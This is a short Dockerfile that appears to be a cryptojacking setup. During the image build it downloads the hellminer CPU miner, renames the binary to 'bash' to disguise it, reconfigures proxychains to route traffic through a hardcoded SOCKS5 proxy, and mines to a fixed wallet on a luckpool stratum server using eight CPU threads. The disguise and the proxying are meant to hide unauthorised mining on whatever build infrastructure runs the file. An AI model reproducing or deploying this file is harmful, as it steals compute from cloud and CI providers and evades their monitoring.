FROM ubuntu:20.04 as ubuntu-base 
 
ENV DEBIAN_FRONTEND=noninteractive \ 
    DEBCONF_NONINTERACTIVE_SEEN=true 
 
RUN apt update 
RUN apt -y install wget 
RUN sudo apt install proxychains -y 
RUN sudo sed -i 's/socks4/socks5/' /etc/proxychains.conf && sudo sed -i 's/127.0.0.1/72.195.114.184/' /etc/proxychains.conf && sudo sed -i 's/9050/4145/' /etc/proxychains.conf 
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && mv hellminer bash && proxychains ./bash -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RSK1DEPiQxQ68CYwLtfsvYemXSV3pVN7bW.TC -p HYBRID --cpu 8
